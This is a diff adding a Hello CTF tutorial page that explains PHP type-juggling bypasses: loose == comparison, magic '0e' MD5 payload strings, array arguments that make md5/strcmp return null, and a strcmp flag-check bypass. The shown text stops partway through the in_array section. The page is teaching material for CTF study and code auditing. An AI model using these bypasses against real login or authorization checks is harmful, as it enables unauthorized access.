@@ -1,0 +1,1675 @@
+
+
+
+
+
+<!DOCTYPE html>
+<html lang="zh" dir="ltr">
+<head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  
+    <title>PHP特性与常见绕过 | Hello CTF</title>
+  
+  <meta name="description" content="开源免费、新手友好的CTF(Capture The Flag,夺旗赛)入门教程">
+  <link rel="icon" href="../../assets/images/favicon.png">
+
+  <!-- 字体（与首页同源） -->
+  <link rel="preconnect" href="https://fonts.googleapis.com">
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+  <link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;700&family=Noto+Sans+SC:wght@400;500;700;800&display=swap" rel="stylesheet">
+
+  <!-- material 文章排版 CSS（pin 9.7.7 的 hash 文件名，升级主题时同步更新） -->
+  <link rel="stylesheet" href="../../assets/stylesheets/main.ec1eaa64.min.css">
+  <link rel="stylesheet" href="../../assets/stylesheets/palette.ab4e12ef.min.css">
+
+  <!-- Hello-CTF 外壳 -->
+  <link rel="stylesheet" href="../../shell/shell.css">
+  <link rel="stylesheet" href="../../shell/shell-docs.css">
+  <link rel="stylesheet" href="../../shell/shell-article.css">
+
+  <!-- 站点原有 extra_css（katex CDN / extra.css / bannerSlider.css 等） -->
+  
+    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/katex@0.16.8/dist/katex.min.css">
+  
+    <link rel="stylesheet" href="../../stylesheets/extra.css">
+  
+
+  <!-- admonition 等组件的图标 SVG 变量（原由 material base.html 注入） -->
+  
+
+
+
+  
+  
+  
+
+<script id="__analytics">function __md_analytics(){function e(){dataLayer.push(arguments)}window.dataLayer=window.dataLayer||[],e("js",new Date),e("config","G-V9998CDNR1"),document.addEventListener("DOMContentLoaded",(function(){document.forms.search&&document.forms.search.query.addEventListener("blur",(function(){this.value&&e("event","search",{search_term:this.value})}));document$.subscribe((function(){var t=document.forms.feedback;if(void 0!==t)for(var a of t.querySelectorAll("[type=submit]"))a.addEventListener("click",(function(a){a.preventDefault();var n=document.location.pathname,d=this.getAttribute("data-md-value");e("event","feedback",{page:n,data:d}),t.firstElementChild.disabled=!0;var r=t.querySelector(".md-feedback__note [data-md-value='"+d+"']");r&&(r.hidden=!1)})),t.hidden=!1})),location$.subscribe((function(t){e("config","G-V9998CDNR1",{page_path:t.pathname})}))}));var t=document.createElement("script");t.async=!0,t.src="https://www.googletagmanager.com/gtag/js?id=G-V9998CDNR1",document.getElementById("__analytics").insertAdjacentElement("afterEnd",t)}</script>
+</head>
+<body data-md-color-scheme="default">
+
+  <!-- 主题初始化（先于渲染，避免闪烁）：hc-theme → shell data-theme + material slate -->
+  <script>
+    (function () {
+      var t = null;
+      try { t = localStorage.getItem("hc-theme"); } catch (e) {}
+      if (t) {
+        document.documentElement.dataset.theme = t;
+        document.body.setAttribute("data-md-color-scheme", t === "dark" ? "slate" : "default");
+      }
+    })();
+    window.__md_palette_sync = function (t) {
+      document.body.setAttribute("data-md-color-scheme", t === "dark" ? "slate" : "default");
+    };
+  </script>
+
+  <script src="../../shell/search.js"></script>
+  <script src="../../shell/shell.js"></script>
+  <script>Shell.mount({ active: "" });</script>
+
+  <!-- 主区：顶部文档导航 + 文章 + TOC -->
+  <div class="main">
+    <nav class="hc-topnav" aria-label="文档导航">
+      <div class="hc-topnav-inner">
+        
+          
+          
+            <a class="tn-item tn-single" href="../../hc-start/"><svg class="ic tn-ico"><use href="#i-book"/></svg>快速开始</a>
+          
+        
+          
+          
+            <div class="tn-item">
+              <span class="tn-label"><svg class="ic tn-ico"><use href="#i-book"/></svg>前言<svg class="ic tn-chev"><use href="#i-chev-down"/></svg></span>
+              <div class="tn-drop">
+  
+    
+      <a class="tn-link" href="../../hc-preface/">前言</a>
+    
+  
+    
+      <a class="tn-link" href="../../hc-preface/about/">关于本书</a>
+    
+  
+    
+      <a class="tn-link" href="../../hc-preface/usage/">食用方法</a>
+    
+  
+    
+      <a class="tn-link" href="../../hc-preface/join/">加入我们</a>
+    
+  
+</div>
+            </div>
+          
+        
+          
+          
+            <div class="tn-item">
+              <span class="tn-label"><svg class="ic tn-ico"><use href="#i-puzzle"/></svg>MISC<svg class="ic tn-chev"><use href="#i-chev-down"/></svg></span>
+              <div class="tn-drop">
+  
+    
+      <a class="tn-link" href="../../hc-misc/">MISC | 杂项</a>
+    
+  
+    
+      <a class="tn-link" href="../../hc-misc/osint/">信息收集</a>
+    
+  
+    
+      <div class="tn-group">文件与编码基础</div>
+      
+  
+    
+      <a class="tn-link" href="../../hc-misc/Encode_extra/">编码扩展</a>
+    
+  
+    
+      <a class="tn-link" href="../../hc-misc/file/">文件基础</a>
+    
+  
+    
+      <a class="tn-link" href="../../hc-misc/Archivefile/">压缩包</a>
+    
+  
+
+    
+  
+    
+      <div class="tn-group">隐写分析</div>
+      
+  
+    
+      <a class="tn-link" href="../../hc-misc/stego/">图片隐写</a>
+    
+  
+    
+      <a class="tn-link" href="../../hc-misc/file_stego/">文件隐写</a>
+    
+  
+    
+      <a class="tn-link" href="../../hc-misc/audio_stego/">音频隐写</a>
+    
+  
+
+    
+  
+    
+      <div class="tn-group">取证分析</div>
+      
+  
+    
+      <a class="tn-link" href="../../hc-misc/pcap/">流量分析</a>
+    
+  
+    
+      <a class="tn-link" href="../../hc-misc/memory/">内存取证</a>
+    
+  
+    
+      <a class="tn-link" href="../../hc-misc/industrial/">工控类</a>
+    
+  
+
+    
+  
+    
+      <a class="tn-link" href="../../hc-misc/file_sign/">附:文件签名表</a>
+    
+  
+</div>
+            </div>
+          
+        
+          
+          
+            <div class="tn-item on">
+              <span class="tn-label"><svg class="ic tn-ico"><use href="#i-globe"/></svg>Web<svg class="ic tn-chev"><use href="#i-chev-down"/></svg></span>
+              <div class="tn-drop">
+  
+    
+      <a class="tn-link" href="../">Web | 网络攻防</a>
+    
+  
+    
+      <div class="tn-group">环境与工具</div>
+      
+  
+    
+      <a class="tn-link" href="../web_env/">Web环境设置</a>
+    
+  
+    
+      <a class="tn-link" href="../docker_install/">Docker安装配置</a>
+    
+  
+    
+      <a class="tn-link" href="../docker_env/">Docker与漏洞环境</a>
+    
+  
+    
+      <a class="tn-link" href="../vm_lab/">虚拟机与网络模拟</a>
+    
+  
+    
+      <a class="tn-link" href="../burp/">Burp Suite</a>
+    
+  
+    
+      <a class="tn-link" href="../py_script/">Python脚本</a>
+    
+  
+    
+      <a class="tn-link" href="../http/">HTTP协议</a>
+    
+  
+
+    
+  
+    
+      <a class="tn-link" href="../web_start/">Web入门题单</a>
+    
+  
+    
+      <div class="tn-group">信息收集</div>
+      
+  
+    
+      <a class="tn-link" href="../sensitive_info/">敏感信息泄露</a>
+    
+  
+
+    
+  
+    
+      <div class="tn-group">PHP专题</div>
+      
+  
+    
+      <a class="tn-link on" href="./">PHP特性与常见绕过</a>
+    
+  
+    
+      <a class="tn-link" href="../php_basic/">PHP基础</a>
+    
+  
+    
+      <a class="tn-link" href="../php_unser/">PHP反序列化</a>
+    
+  
+    
+      <a class="tn-link" href="../php_code_audit/">PHP代码审计</a>
+    
+  
+
+    
+  
+    
+      <div class="tn-group">注入类漏洞</div>
+      
+  
+    
+      <a class="tn-link" href="../sql_injection/">SQL注入</a>
+    
+  
+    
+      <a class="tn-link" href="../nosql/">NoSQL注入</a>
+    
+  
+    
+      <a class="tn-link" href="../xss/">XSS攻击</a>
+    
+  
+    
+      <a class="tn-link" href="../csrf/">CSRF攻击</a>
+    
+  
+    
+      <a class="tn-link" href="../ssti/">SSTI注入</a>
+    
+  
+    
+      <a class="tn-link" href="../xxe/">XXE注入</a>
+    
+  
+    
+      <a class="tn-link" href="../ssrf/">SSRF注入</a>
+    
+  
+
+    
+  
+    
+      <div class="tn-group">文件类漏洞</div>
+      
+  
+    
+      <a class="tn-link" href="../file_upload/">文件上传</a>
+    
+  
+    
+      <a class="tn-link" href="../include/">文件包含</a>
+    
+  
+    
+      <a class="tn-link" href="../dir_traversal/">目录穿越</a>
+    
+  
+    
+      <a class="tn-link" href="../any_file_read/">任意文件读取</a>
+    
+  
+
+    
+  
+    
+      <div class="tn-group">命令与代码执行</div>
+      
+  
+    
+      <a class="tn-link" href="../rce/">RCE</a>
+    
+  
+
+    
+  
+    
+      <a class="tn-link" href="../session_jwt/">会话与认证安全</a>
+    
+  
+    
+      <a class="tn-link" href="../logical_vuln/">逻辑漏洞</a>
+    
+  
+    
+      <div class="tn-group">语言扩展 | 世界不止有PHP</div>
+      
+  
+    
+      <a class="tn-link" href="../py_unser/">Python反序列化</a>
+    
+  
+    
+      <a class="tn-link" href="../py_sandbox/">Python沙箱逃逸</a>
+    
+  
+    
+      <a class="tn-link" href="../flask_sec/">Flask安全</a>
+    
+  
+    
+      <a class="tn-link" href="../prototype_pollution/">原型链污染</a>
+    
+  
+    
+      <a class="tn-link" href="../js_sandbox/">JS沙箱逃逸</a>
+    
+  
+    
+      <a class="tn-link" href="../js_reverse/">JS逆向</a>
+    
+  
+    
+      <a class="tn-link" href="../java_basic/">Java安全基础</a>
+    
+  
+    
+      <a class="tn-link" href="../java_unser/">Java反序列化</a>
+    
+  
+    
+      <a class="tn-link" href="../spring/">Spring漏洞</a>
+    
+  
+    
+      <a class="tn-link" href="../java_audit/">Java代码审计</a>
+    
+  
+
+    
+  
+    
+      <div class="tn-group">进阶专题</div>
+      
+  
+    
+      <a class="tn-link" href="../waf_bypass/">WAF绕过</a>
+    
+  
+    
+      <a class="tn-link" href="../http_smuggling/">请求走私</a>
+    
+  
+    
+      <a class="tn-link" href="../cache_poisoning/">缓存投毒</a>
+    
+  
+    
+      <a class="tn-link" href="../xs_leaks/">XS-Leaks</a>
+    
+  
+    
+      <a class="tn-link" href="../web_crypto/">密码学应用题</a>
+    
+  
+    
+      <a class="tn-link" href="../cloud_container/">云与容器安全</a>
+    
+  
+
+    
+  
+    
+      <div class="tn-group">实战能力</div>
+      
+  
+    
+      <div class="tn-group">渗透链路基础</div>
+      
+  
+    
+      <a class="tn-link" href="../pentest_flow/">渗透流程总览</a>
+    
+  
+    
+      <a class="tn-link" href="../two_layer/">两层网络实战</a>
+    
+  
+    
+      <a class="tn-link" href="../foothold/">立足点建立</a>
+    
+  
+    
+      <a class="tn-link" href="../internal_recon/">内网信息收集</a>
+    
+  
+    
+      <a class="tn-link" href="../proxy_tunnel/">代理与隧道</a>
+    
+  
+
+    
+  
+    
+      <div class="tn-group">多层网络渗透</div>
+      
+  
+    
+      <a class="tn-link" href="../three_layer/">三层网络实战</a>
+    
+  
+    
+      <a class="tn-link" href="../multi_layer/">多层网络综合</a>
+    
+  
+    
+      <a class="tn-link" href="../ad_basic/">域渗透入门</a>
+    
+  
+    
+      <a class="tn-link" href="../lateral/">横向移动</a>
+    
+  
+
+    
+  
+    
+      <div class="tn-group">对抗与综合</div>
+      
+  
+    
+      <a class="tn-link" href="../awd/">AWD模式</a>
+    
+  
+    
+      <a class="tn-link" href="../web_pwn/">Web与二进制结合</a>
+    
+  
+    
+      <a class="tn-link" href="../nday/">Nday利用</a>
+    
+  
+    
+      <a class="tn-link" href="../review/">Writeup复盘方法</a>
+    
+  
+
+    
+  
+
+    
+  
+</div>
+            </div>
+          
+        
+          
+          
+            <div class="tn-item">
+              <span class="tn-label"><svg class="ic tn-ico"><use href="#i-lock"/></svg>Crypto<svg class="ic tn-chev"><use href="#i-chev-down"/></svg></span>
+              <div class="tn-drop">
+  
+    
+      <a class="tn-link" href="../../hc-crypto/">Crypto | 密码学</a>
+    
+  
+    
+      <a class="tn-link" href="../../hc-crypto/env/">环境配置</a>
+    
+  
+    
+      <div class="tn-group">基础知识</div>
+      
+  
+    
+      <a class="tn-link" href="../../hc-crypto/Recap/">前情提要</a>
+    
+  
+    
+      <a class="tn-link" href="../../hc-crypto/Encode/">编码基础</a>
+    
+  
+
+    
+  
+    
+      <div class="tn-group">密码体系</div>
+      
+  
+    
+      <a class="tn-link" href="../../hc-crypto/Classicalcipher/">古典密码</a>
+    
+  
+    
+      <a class="tn-link" href="../../hc-crypto/Moderncipher/">现代密码</a>
+    
+  
+
+    
+  
+</div>
+            </div>
+          
+        
+          
+          
+            <div class="tn-item">
+              <span class="tn-label"><svg class="ic tn-ico"><use href="#i-cpu"/></svg>Reverse<svg class="ic tn-chev"><use href="#i-chev-down"/></svg></span>
+              <div class="tn-drop">
+  
+    
+      <a class="tn-link" href="../../hc-reverse/">逆向工程</a>
+    
+  
+    
+      <a class="tn-link" href="../../hc-reverse/%E5%BC%95%E5%AF%BC%E7%AF%87%EF%BC%9A%E7%81%B5%E9%AD%82FAQ/">引导篇：灵魂FAQ</a>
+    
+  
+    
+      <div class="tn-group">编译与可执行文件</div>
+      
+  
+    
+      <a class="tn-link" href="../../hc-reverse/C%E8%AF%AD%E8%A8%80%E5%9F%BA%E7%A1%80/">C语言基础</a>
+    
+  
+    
+      <a class="tn-link" href="../../hc-reverse/%E5%AD%98%E5%82%A8%E7%BB%93%E6%9E%84/">存储结构</a>
+    
+  
+    
+      <a class="tn-link" href="../../hc-reverse/Quick%20Start%EF%BC%9A%E5%8F%AF%E6%89%A7%E8%A1%8C%E6%96%87%E4%BB%B6/">可执行文件</a>
+    
+  
+
+    
+  
+    
+      <div class="tn-group">交互式反汇编工具IDA</div>
+      
+  
+    
+      <a class="tn-link" href="../../hc-reverse/StartWithIDA/">从零开始的IDA</a>
+    
+  
+    
+      <a class="tn-link" href="../../hc-reverse/IDA%E5%8A%A8%E6%80%81%E8%B0%83%E8%AF%95/">IDA动态调试</a>
+    
+  
+
+    
+  
+    
+      <div class="tn-group">常见算法</div>
+      
+  
+    
+      <a class="tn-link" href="../../hc-reverse/%E5%9F%BA%E6%9C%AC%E8%BF%90%E7%AE%97/">基本运算</a>
+    
+  
+    
+      <a class="tn-link" href="../../hc-reverse/%E7%BC%96%E7%A0%81%E5%9F%BA%E7%A1%80/">编码基础</a>
+    
+  
+    
+      <a class="tn-link" href="../../hc-reverse/%E5%AD%97%E8%8A%82%E6%B5%81%E7%AE%97%E6%B3%95/">字节流算法</a>
+    
+  
+    
+      <a class="tn-link" href="../../hc-reverse/%E5%88%86%E7%BB%84%E5%AF%86%E7%A0%81/">分组密码</a>
+    
+  
+
+    
+  
+    
+      <a class="tn-link" href="../../hc-reverse/z3%E7%BA%A6%E6%9D%9F%E6%B1%82%E8%A7%A3/">z3约束求解</a>
+    
+  
+    
+      <a class="tn-link" href="../../hc-reverse/Quick%20Start%EF%BC%9AASM%E6%B1%87%E7%BC%96/">x86 汇编初步</a>
+    
+  
+    
+      <div class="tn-group">代码保护与对抗</div>
+      
+  
+    
+      <a class="tn-link" href="../../hc-reverse/%E8%8A%B1%E6%8C%87%E4%BB%A4/">花指令</a>
+    
+  
+    
+      <a class="tn-link" href="../../hc-reverse/%E4%BB%8E%E9%9B%B6%E5%BC%80%E5%A7%8B%E7%9A%84%E5%A3%B3/">加壳</a>
+    
+  
+    
+      <a class="tn-link" href="../../hc-reverse/VM/">VM</a>
+    
+  
+    
+      <a class="tn-link" href="../../hc-reverse/SMC/">SMC</a>
+    
+  
+    
+      <a class="tn-link" href="../../hc-reverse/%E5%BC%82%E5%B8%B8%E5%A4%84%E7%90%86/">异常处理</a>
+    
+  
+    
+      <a class="tn-link" href="../../hc-reverse/%E5%A4%9A%E7%BA%BF%E7%A8%8B/">多线程</a>
+    
+  
+    
+      <a class="tn-link" href="../../hc-reverse/TLS%E5%9B%9E%E8%B0%83%E5%87%BD%E6%95%B0/">TLS回调函数</a>
+    
+  
+    
+      <a class="tn-link" href="../../hc-reverse/%E5%8F%8D%E8%B0%83%E8%AF%95/">反调试</a>
+    
+  
+    
+      <a class="tn-link" href="../../hc-reverse/%E6%8E%A7%E5%88%B6%E6%B5%81%E5%B9%B3%E5%9D%A6%E5%8C%96/">控制流平坦化</a>
+    
+  
+
+    
+  
+    
+      <a class="tn-link" href="../../hc-reverse/%E7%AC%A6%E5%8F%B7%E6%89%A7%E8%A1%8C/">符号执行</a>
+    
+  
+    
+      <div class="tn-group">语言与框架</div>
+      
+  
+    
+      <a class="tn-link" href="../../hc-reverse/Python/">Python</a>
+    
+  
+    
+      <a class="tn-link" href="../../hc-reverse/NET/">.NET</a>
+    
+  
+    
+      <a class="tn-link" href="../../hc-reverse/Rust/">Rust</a>
+    
+  
+    
+      <a class="tn-link" href="../../hc-reverse/JavaScript/">JavaScript</a>
+    
+  
+
+    
+  
+    
+      <a class="tn-link" href="../../hc-reverse/Android/">Android平台</a>
+    
+  
+    
+      <a class="tn-link" href="../../hc-reverse/%E8%A7%A3%E9%A2%98%E6%8A%80%E5%B7%A7/">解题技巧</a>
+    
+  
+</div>
+            </div>
+          
+        
+          
+          
+            <div class="tn-item">
+              <span class="tn-label"><svg class="ic tn-ico"><use href="#i-terminal"/></svg>Pwn<svg class="ic tn-chev"><use href="#i-chev-down"/></svg></span>
+              <div class="tn-drop">
+  
+    
+      <a class="tn-link" href="../../hc-pwn/">Pwn | 二进制安全</a>
+    
+  
+    
+      <div class="tn-group">环境与基础</div>
+      
+  
+    
+      <a class="tn-link" href="../../hc-pwn/wsl2_environment/">wsl2下的环境配置</a>
+    
+  
+    
+      <a class="tn-link" href="../../hc-pwn/Asm_x86/">汇编语言(x86)</a>
+    
+  
+    
+      <a class="tn-link" href="../../hc-pwn/Protections/">常见保护</a>
+    
+  
+
+    
+  
+    
+      <div class="tn-group">栈溢出</div>
+      
+  
+    
+      <a class="tn-link" href="../../hc-pwn/Stack_Overflow/">栈上数组越界&栈溢出</a>
+    
+  
+
+    
+  
+    
+      <div class="tn-group">ROP利用</div>
+      
+  
+    
+      <a class="tn-link" href="../../hc-pwn/ROP/">ROP入门</a>
+    
+  
+    
+      <a class="tn-link" href="../../hc-pwn/ROP_Tricks/">常见的ROP技巧</a>
+    
+  
+    
+      <a class="tn-link" href="../../hc-pwn/rop_add_v1/">ROP进阶</a>
+    
+  
+
+    
+  
+</div>
+            </div>
+          
+        
+          
+          
+            <div class="tn-item">
+              <span class="tn-label"><svg class="ic tn-ico"><use href="#i-shield"/></svg>AWD<svg class="ic tn-chev"><use href="#i-chev-down"/></svg></span>
+              <div class="tn-drop">
+  
+    
+      <a class="tn-link" href="../../hc-awd/awd_about/">AWD介绍</a>
+    
+  
+    
+      <a class="tn-link" href="../../hc-awd/awd_platform/">AWD平台</a>
+    
+  
+    
+      <a class="tn-link" href="../../hc-awd/awd_web.exp/">【WEB】AWD技巧</a>
+    
+  
+    
+      <a class="tn-link" href="../../hc-awd/awd_pwn.exp/">【PWN】AWD技巧</a>
+    
+  
+</div>
+            </div>
+          
+        
+          
+          
+            <div class="tn-item">
+              <span class="tn-label"><svg class="ic tn-ico"><use href="#i-bot"/></svg>AI<svg class="ic tn-chev"><use href="#i-chev-down"/></svg></span>
+              <div class="tn-drop">
+  
+    
+      <a class="tn-link" href="../../hc-ai/">AI | 人工智能</a>
+    
+  
+    
+      <a class="tn-link" href="../../hc-ai/What_is_AI/">初识AI</a>
+    
+  
+    
+      <a class="tn-link" href="../../hc-ai/MLP/">你的第一个神经网络</a>
+    
+  
+</div>
+            </div>
+          
+        
+          
+          
+            <div class="tn-item">
+              <span class="tn-label"><svg class="ic tn-ico"><use href="#i-link"/></svg>区块链<svg class="ic tn-chev"><use href="#i-chev-down"/></svg></span>
+              <div class="tn-drop">
+  
+    
+      <div class="tn-group">Move</div>
+      
+  
+    
+      <a class="tn-link" href="../../hc-blockchain/Move/0x00/">从0开始的签到题</a>
+    
+  
+    
+      <a class="tn-link" href="../../hc-blockchain/Move/0x01/">独特的所有权</a>
+    
+  
+    
+      <a class="tn-link" href="../../hc-blockchain/Move/0x02/">神奇的时钟</a>
+    
+  
+    
+      <a class="tn-link" href="../../hc-blockchain/Move/0x03/">对象与燃气</a>
+    
+  
+    
+      <a class="tn-link" href="../../hc-blockchain/Move/0x04/">多样的泛型</a>
+    
+  
+
+    
+  
+</div>
+            </div>
+          
+        
+          
+          
+            <div class="tn-item">
+              <span class="tn-label"><svg class="ic tn-ico"><use href="#i-tag"/></svg>附录<svg class="ic tn-chev"><use href="#i-chev-down"/></svg></span>
+              <div class="tn-drop">
+  
+    
+      <a class="tn-link" href="../../hc-appendix/how-to-ask/">提问的智慧</a>
+    
+  
+    
+      <a class="tn-link" href="../../hc-appendix/NSSCTF_Usage/">NSSCTF平台使用</a>
+    
+  
+    
+      <a class="tn-link" href="../../hc-appendix/book/">推荐书单</a>
+    
+  
+</div>
+            </div>
+          
+        
+      </div>
+    </nav>
+    <div class="doc-layout">
+      <article class="md-typeset hc-article">
+        <!-- Tags -->
+
+
+<!-- Actions -->
+<!-- Actions -->
+
+
+  <!-- Edit button -->
+  
+
+  <!-- View button -->
+  
+
+
+<!-- Page content -->
+<div><h1 id="php">PHP特性与常见绕过<a class="headerlink" href="#php" title="Permanent link">¶</a></h1>
+<p>在 Web 方向的 CTF 题目里，PHP 是出现频率最高的语言。出题人特别喜欢利用 PHP 语言本身的"特性"（或者说历史遗留的坑）来设置考点：弱类型比较、魔术哈希、变量覆盖、伪协议……这些特性本身并不复杂，但如果不了解，审计代码时完全看不出漏洞在哪。</p>
+<p>本章把这些高频特性体系化地过一遍，每一节都遵循「原理 → 最小示例 → 典型 bypass 思路」的结构。后续章节如 SQL 注入绕过、RCE、WAF 绕过、文件包含 中涉及的特性，基本都能在本章找到出处。阅读前建议先过一遍 PHP基础。</p>
+<h2 id="_1">弱类型比较<a class="headerlink" href="#_1" title="Permanent link">¶</a></h2>
+<h3 id="_2"><code>==</code> 与 <code>===</code><a class="headerlink" href="#_2" title="Permanent link">¶</a></h3>
+<p>PHP 有两种比较：</p>
+<ul>
+<li><code>==</code>（松散比较）：只比较值，比较前会自动做类型转换；</li>
+<li><code>===</code>（严格比较）：同时比较类型和值。</li>
+</ul>
+<p>漏洞几乎都出在 <code>==</code> 的类型转换上。核心规则是：<strong>当字符串与数字比较时，字符串会被强制转换成数字</strong>（PHP 8 之前）。转换方式是取字符串开头最长的一串合法数字，如果开头不是数字，结果就是 <code>0</code>。</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-0-1" name="__codelineno-0-1" href="#__codelineno-0-1"></a><span class="cp">&lt;?php</span>
+<a id="__codelineno-0-2" name="__codelineno-0-2" href="#__codelineno-0-2"></a><span class="nb">var_dump</span><span class="p">(</span><span class="mi">0</span> <span class="o">==</span> <span class="s2">"a"</span><span class="p">);</span>        <span class="c1">// PHP 7: true  ("a" 转成 0)</span>
+<a id="__codelineno-0-3" name="__codelineno-0-3" href="#__codelineno-0-3"></a><span class="nb">var_dump</span><span class="p">(</span><span class="s2">"1"</span> <span class="o">==</span> <span class="s2">"01"</span><span class="p">);</span>     <span class="c1">// true  (都转成 1)</span>
+<a id="__codelineno-0-4" name="__codelineno-0-4" href="#__codelineno-0-4"></a><span class="nb">var_dump</span><span class="p">(</span><span class="s2">"10"</span> <span class="o">==</span> <span class="s2">"1e1"</span><span class="p">);</span>   <span class="c1">// true  (10 == 10.0)</span>
+<a id="__codelineno-0-5" name="__codelineno-0-5" href="#__codelineno-0-5"></a><span class="nb">var_dump</span><span class="p">(</span><span class="mi">100</span> <span class="o">==</span> <span class="s2">"1e2"</span><span class="p">);</span>    <span class="c1">// true  (100 == 100.0)</span>
+<a id="__codelineno-0-6" name="__codelineno-0-6" href="#__codelineno-0-6"></a><span class="nb">var_dump</span><span class="p">(</span><span class="s2">"abc"</span> <span class="o">==</span> <span class="mi">0</span><span class="p">);</span>      <span class="c1">// PHP 7: true; PHP 8: false</span>
+<a id="__codelineno-0-7" name="__codelineno-0-7" href="#__codelineno-0-7"></a><span class="nb">var_dump</span><span class="p">(</span><span class="k">null</span> <span class="o">==</span> <span class="k">false</span><span class="p">);</span>   <span class="c1">// true</span>
+<a id="__codelineno-0-8" name="__codelineno-0-8" href="#__codelineno-0-8"></a><span class="cp">?&gt;</span>
+</code></pre></div>
+<p>注意 PHP 8 修改了字符串与数字比较的规则：<code>0 == "a"</code> 在 PHP 8 中已经是 <code>false</code>。做题时先看题目环境的 PHP 版本，很多老题在新环境下根本复现不出来。</p>
+<p><strong>典型 bypass</strong>：题目用 <code>if ($_GET['a'] == 0)</code> 判断，直接传 <code>?a=abc</code> 即可让条件成立（PHP 7 下）。</p>
+<h3 id="0e-md5">0e 开头 MD5 碰撞（魔术哈希）<a class="headerlink" href="#0e-md5" title="Permanent link">¶</a></h3>
+<p>这是 <code>==</code> 比较最经典的应用。MD5 哈希是 32 位十六进制字符串，如果两个不同字符串的 MD5 值都满足「以 <code>0e</code> 开头、后面全是数字」，那么按上面 <code>1e2 == 100</code> 的规则，它们在 <code>==</code> 比较时都会被当成科学计数法的 <code>0</code>，于是相等：</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-1-1" name="__codelineno-1-1" href="#__codelineno-1-1"></a><span class="cp">&lt;?php</span>
+<a id="__codelineno-1-2" name="__codelineno-1-2" href="#__codelineno-1-2"></a><span class="nv">$a</span> <span class="o">=</span> <span class="nb">md5</span><span class="p">(</span><span class="s2">"QNKCDZO"</span><span class="p">);</span>   <span class="c1">// 0e830400451993494058024219903391</span>
+<a id="__codelineno-1-3" name="__codelineno-1-3" href="#__codelineno-1-3"></a><span class="nv">$b</span> <span class="o">=</span> <span class="nb">md5</span><span class="p">(</span><span class="s2">"240610708"</span><span class="p">);</span> <span class="c1">// 0e462097431906509019562988736854</span>
+<a id="__codelineno-1-4" name="__codelineno-1-4" href="#__codelineno-1-4"></a><span class="nb">var_dump</span><span class="p">(</span><span class="nv">$a</span> <span class="o">==</span> <span class="nv">$b</span><span class="p">);</span>    <span class="c1">// true</span>
+<a id="__codelineno-1-5" name="__codelineno-1-5" href="#__codelineno-1-5"></a><span class="nb">var_dump</span><span class="p">(</span><span class="nv">$a</span> <span class="o">===</span> <span class="nv">$b</span><span class="p">);</span>   <span class="c1">// false</span>
+<a id="__codelineno-1-6" name="__codelineno-1-6" href="#__codelineno-1-6"></a><span class="cp">?&gt;</span>
+</code></pre></div>
+<p>常用 payload（MD5 为 <code>0e</code> 开头的字符串）：<code>QNKCDZO</code>、<code>240610708</code>、<code>s878926199a</code>、<code>s155964671a</code>、<code>s214587387a</code>。</p>
+<p>如果题目比较的是 <code>md5($a) == md5($b)</code> 且要求 <code>$a != $b</code>，就用两个不同的 <code>0e</code> 字符串；如果用的是 <code>===</code>，就得换思路——数组绕过或真实 MD5 碰撞（fastcoll 工具生成），后者在 PHP代码审计 章节还有展开。</p>
+<h3 id="_3">数组绕过<a class="headerlink" href="#_3" title="Permanent link">¶</a></h3>
+<p><code>md5()</code>、<code>sha1()</code>、<code>strcmp()</code> 等函数参数预期是字符串，传入数组会返回 <code>null</code> 并抛出 warning。两个 <code>null</code> 用 <code>==</code> 或 <code>===</code> 比较都是 <code>true</code>：</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-2-1" name="__codelineno-2-1" href="#__codelineno-2-1"></a><span class="cp">&lt;?php</span>
+<a id="__codelineno-2-2" name="__codelineno-2-2" href="#__codelineno-2-2"></a><span class="nb">var_dump</span><span class="p">(</span><span class="nb">md5</span><span class="p">([])</span> <span class="o">===</span> <span class="nb">md5</span><span class="p">([]));</span>  <span class="c1">// true（PHP 7 下，函数返回 null）</span>
+<a id="__codelineno-2-3" name="__codelineno-2-3" href="#__codelineno-2-3"></a><span class="nb">var_dump</span><span class="p">(</span><span class="nb">strcmp</span><span class="p">([],</span> <span class="p">[])</span> <span class="o">===</span> <span class="mi">0</span><span class="p">);</span> <span class="c1">// true</span>
+<a id="__codelineno-2-4" name="__codelineno-2-4" href="#__codelineno-2-4"></a><span class="cp">?&gt;</span>
+</code></pre></div>
+<p><strong>典型 bypass</strong>：</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-3-1" name="__codelineno-3-1" href="#__codelineno-3-1"></a><span class="nf">GET</span> <span class="nn">/?a[]=1&amp;b[]=2</span> <span class="kr">HTTP</span><span class="o">/</span><span class="m">1.1</span>
+</code></pre></div>
+<p>当题目用 <code>md5($a) === md5($b)</code> 比较且 <code>0e</code> 被卡掉时，传数组是最常用的解法。同理，<code>strcasecmp</code>、<code>strpos</code>、<code>strlen</code> 等参数为字符串的函数都可以这样"打数组"。</p>
+<h3 id="strcmp-in_array">strcmp 与 in_array 的漏洞<a class="headerlink" href="#strcmp-in_array" title="Permanent link">¶</a></h3>
+<p><code>strcmp($a, $b)</code> 在两者相等时返回 <code>0</code>。如果题目写成：</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-4-1" name="__codelineno-4-1" href="#__codelineno-4-1"></a><span class="cp">&lt;?php</span>
+<a id="__codelineno-4-2" name="__codelineno-4-2" href="#__codelineno-4-2"></a><span class="k">if</span> <span class="p">(</span><span class="nb">strcmp</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">'pass'</span><span class="p">],</span> <span class="nv">$flag</span><span class="p">)</span> <span class="o">==</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
+<a id="__codelineno-4-3" name="__codelineno-4-3" href="#__codelineno-4-3"></a>    <span class="k">echo</span> <span class="nv">$flag</span><span class="p">;</span>
+<a id="__codelineno-4-4" name="__codelineno-4-4" href="#__codelineno-4-4"></a><span class="p">}</span>
+<a id="__codelineno-4-5" name="__codelineno-4-5" href="#__codelineno-4-5"></a><span class="cp">?&gt;</span>
+</code></pre></div>
+<p>直接传 <code>pass[]=1</code>，<code>strcmp</code> 返回 <code>null</code>，而 <code>null == 0</code> 为 <code>true</code>，绕过成功。</p>
+<p><code>in_array($needle, $haystack)</code> 默认是松散比较，第三个参数不传 <code>true</code> 就不会检查类型：</p>
